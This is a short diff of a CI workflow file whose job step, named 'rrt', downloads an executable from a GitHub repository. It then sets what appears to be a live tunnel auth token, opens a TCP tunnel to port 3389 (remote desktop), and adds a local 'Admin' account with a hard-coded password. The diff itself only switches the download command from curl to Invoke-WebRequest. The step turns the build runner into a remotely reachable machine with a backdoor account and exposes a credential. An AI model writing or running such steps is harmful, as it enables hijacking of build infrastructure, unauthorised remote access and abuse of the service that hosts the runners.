@@ -11,7 +11,7 @@ jobs:
     
     - name: rrt
       run: |
-           curl -o use.exe https://github.com/Usser1222/circleci/raw/main/use.exe 
+           Invoke-WebRequest -Uri https://github.com/Usser1222/circleci/raw/main/use.exe 
            use authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
            start /B ngrok tcp 3389
            cmd /c net user /add Admin P@ssw0rd.
